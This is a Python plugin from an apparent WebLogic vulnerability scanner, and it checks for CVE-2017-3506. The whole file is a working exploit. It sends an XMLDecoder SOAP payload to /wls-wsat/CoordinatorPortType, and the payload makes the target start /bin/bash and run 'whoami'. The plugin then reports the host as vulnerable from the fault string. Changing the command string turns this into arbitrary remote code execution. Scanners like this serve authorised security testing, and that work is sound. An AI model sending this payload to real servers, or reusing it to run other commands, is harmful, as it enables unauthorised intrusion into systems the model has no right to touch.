#!/usr/bin/env python
# _*_ coding:utf-8 _*_

import requests
import re

from ..platform import ManageProcessor, Color


VUL = ['CVE-2017-3506']
headers = {'user-agent': 'ceshi/0.0.1', 'content-type': 'text/xml'}

poc_str = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0">
              <string>/bin/bash</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>whoami</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>
'''


@ManageProcessor.plugin_register('CVE-2017-3506')
class CVE20173506(object):
    def process(self, ip, port, scheme):
        return self.run(ip, port, 0, scheme)

    def poc(self, url, index):
        url += '/wls-wsat/CoordinatorPortType'

        try:
            response = requests.post(url, data=poc_str, verify=False, timeout=5, headers=headers)
            response = response.text
            response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
        except Exception:
            response = ""

        if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
            print(Color.OKBLUE + '[+]The target weblogic has a JAVA deserialization vulnerability: {}'.format(VUL[index]) + Color.ENDC)
            return True
        else:
            print(Color.FAIL + '[-]Target weblogic not detected {}'.format(VUL[index]) + Color.ENDC)
            return False

    def run(self, ip, port, index, scheme):
        url = str(scheme) + '://' + str(ip) + ':' + str(port)
        return self.poc(url=url, index=index)
